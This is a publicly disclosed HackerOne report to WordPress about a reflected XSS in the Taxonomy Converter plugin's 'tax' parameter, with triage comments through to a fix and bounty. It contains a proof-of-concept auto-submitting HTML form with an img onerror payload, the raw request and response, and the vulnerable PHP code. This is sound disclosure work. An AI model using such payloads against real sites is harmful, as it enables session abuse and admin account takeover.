{"id":495515,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80OTU1MTU=","url":"https://hackerone.com/reports/495515","title":"Reflected XSS: Taxonomy Converter via tax parameter","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-02-13T20:02:37.577Z","submitted_at":"2019-02-13T20:02:37.577Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"foobar7","url":"/foobar7","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":55,"url":"https://hackerone.com/wordpress","handle":"wordpress","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"WordPress","twitter_handle":"wordpress","website":"https://wordpress.org/","about":"Beautiful sites of any kind."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-08-28T15:33:16.538Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-07-29T15:33:01.953Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"CVSS\n----\n\nMedium 6.1 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)\n\nDescription\n-----------\n\nThe [Taxonomy Converter](https://wordpress.org/plugins/taxonomy-converter/) that is listed on the [Official WordPress plugins](https://profiles.wordpress.org/wordpressdotorg/#content-plugins) page is vulnerable to reflected XSS as it echoes the `tax` parameter without encoding. \n\nPOC\n----\n\n    \u003chtml\u003e\n      \u003cbody\u003e\n        \u003cform action=\"http://192.168.0.104/wordpress5/wordpress/wp-admin/admin.php?import=wptaxconvert\u0026tax=categoryx'\u0026quot;\u003e\u003cimg+src%3dx+onerror%3dalert(1)\u003e\u0026step=2\" method=\"POST\" enctype=\"text/plain\"\u003e\n          \u003cinput type=\"hidden\" name=\"test\" value=\"test\u0026#13;\u0026#10;\" /\u003e\n          \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n        \u003c/form\u003e\n        \u003cscript\u003e\n          document.forms[0].submit();\n        \u003c/script\u003e\n      \u003c/body\u003e\n    \u003c/html\u003e\n\nRequest\n--------\n\n    POST /wordpress5/wordpress/wp-admin/admin.php?import=wptaxconvert\u0026tax=categoryx'\"\u003e\u003cimg+src%3dx+onerror%3dalert(1)\u003e\u0026step=2 HTTP/1.1\n    Host: 192.168.0.104\n    [...]\n\n    test=test\n\n    HTTP/1.1 200 OK\n    [...]\n\n\t\u003cp\u003eUh, oh. Something didn\u0026#8217;t work. Please \u003ca href=\"admin.php?import=wptaxconvert\u0026amp;tax=categoryx\\'\\\"\u003e\u003cimg src=x onerror=alert(1)\u003e\"\u003etry again\u003c/a\u003e.\u003c/p\u003e\n\nCode\n----\n\n    /wp-content/plugins/taxonomy-converter/taxonomy-converter.php\n\n\tfunction process($tax) {\n\t\tglobal $wpdb;\n\n\t\tif ( (!isset($_POST['terms_to_convert']) || !is_array($_POST['terms_to_convert'])) \u0026\u0026 empty($this-\u003eterms_to_convert) || (!isset($_POST['taxes'])) ) { ?\u003e\n\t\t\t\u003cdiv class=\"narrow\"\u003e\n\t\t\t\u003cp\u003e\u003c?php printf(__('Uh, oh. Something didn\u0026#8217;t work. Please \u003ca href=\"%s\"\u003etry again\u003c/a\u003e.', 'wptaxconvert'), 'admin.php?import=wptaxconvert\u0026amp;tax='.$tax); ?\u003e\u003c/p\u003e\n\t\t\t\u003c/div\u003e\n    \u003c?php\t\treturn;\n\t\t}\n\nSolution\n--------\n\nApply `esc_url` or similar to `$tax` before passing it to `printf`.\n\n## Impact\n\nWith a successful attack, an attacker can access all data the attacked user has access to, as well as perform arbitrary requests in the name of the attacked user.\n\nIf the attacked user is an administrator, the attacker could for example create a new admin user and thus gain full control of the application (and depending on the settings, the server).","bounty_amount":"275.0","formatted_bounty":"$275","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-08-28T15:33:02.298Z","allow_singular_disclosure_after":-66958375.93812478,"singular_disclosure_allowed":true,"vote_count":15,"voters":["mik317","ali","zeroxyele","yinvi777","cr4xerbik4sh","cryptographer","00xdata","dolph1n","jwhadmin","syhbt","and 5 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":17143,"asset_type":"SOURCE_CODE","asset_identifier":"Official WordPress plugins","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4169433,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for catching this, we've started working on a fix.","automated_response":false,"created_at":"2019-02-18T19:10:21.486Z","updated_at":"2019-02-18T19:10:21.486Z","actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5382209,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @iandunn\n\nany update? This seems like it should be relatively simple to fix. Or are there any unforeseen problems?\n\nBest,\nFoobar7","automated_response":false,"created_at":"2019-07-21T09:07:20.097Z","updated_at":"2019-07-21T09:07:20.097Z","actor":{"username":"foobar7","cleared":true,"url":"/foobar7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5389018,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Tim, sorry for the delay. It turned out that that plugin shouldn't have ever been listed as part of our official program, and the creator said that she was going to fix the vulnerability and remove the `wordpressdotorg` attribution. She hasn't yet, though, so I'll follow up with her.\n\nThis will still qualify for a bounty and everything, since it's not your fault that it was incorrectly listed, but in the future that plugin won't be part of the bounty program.","automated_response":false,"created_at":"2019-07-22T16:14:36.859Z","updated_at":"2019-07-22T16:14:36.859Z","actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5432401,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2019-07-26T00:01:45.246Z","updated_at":"2019-07-26T00:01:45.246Z","actor":{"username":"kristarella","cleared":false,"url":"/kristarella","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5439507,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey Tim, Kristen (the plugin author) has released a new version that fixes the problem.\n\nSince this is no longer listed as an official plugin, any future reports should [go to her directly](https://kristarella.blog/contact/), or to plugins@wordpress.org.\n\nI'll get the bounty process started.","automated_response":false,"created_at":"2019-07-26T15:41:15.065Z","updated_at":"2019-07-26T15:41:15.065Z","actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"foobar7","url":"/foobar7"},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5442103,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-07-27T00:32:46.491Z","updated_at":"2019-07-27T00:32:46.491Z","actor":{"url":"/wordpress","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"WordPress"}},"bounty_amount":"225.0","bounty_currency":"usd","bonus_amount":"50.0","genius_execution_id":null,"team_handle":"wordpress","collaborator":{"username":"foobar7","url":"/foobar7"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5455002,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-07-29T15:33:02.037Z","updated_at":"2019-07-29T15:33:02.037Z","first_to_agree":true,"actor":{"username":"whyisjake","cleared":false,"url":"/whyisjake","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/499/942/de8d53f71535e9531105209e14875727a9e88cfe_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5684465,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-08-28T15:33:16.561Z","updated_at":"2019-08-28T15:33:16.561Z","actor":{"url":"/wordpress","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"WordPress"}},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}